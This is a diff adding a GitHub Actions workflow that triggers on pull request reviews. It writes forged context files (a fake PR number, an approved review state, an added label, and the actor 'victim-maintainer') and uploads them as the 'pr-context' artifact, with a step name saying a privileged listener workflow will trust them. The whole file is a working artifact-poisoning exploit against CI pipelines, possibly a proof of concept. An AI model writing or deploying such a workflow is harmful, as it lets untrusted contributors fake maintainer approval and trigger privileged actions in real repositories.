@@ -1,0 +1,19 @@
+name: Trigger One
+on: pull_request_review
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge the artifact the privileged listener will trust
+        run: |
+          mkdir -p ./context
+          echo 999999 > ./context/pr-number
+          echo reviewer-approved > ./context/label-added
+          echo approved > ./context/review-state
+          echo victim-maintainer > ./context/actor
+          echo labeled > ./context/action
+      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
+        with:
+          name: pr-context
+          path: context/
+          overwrite: true
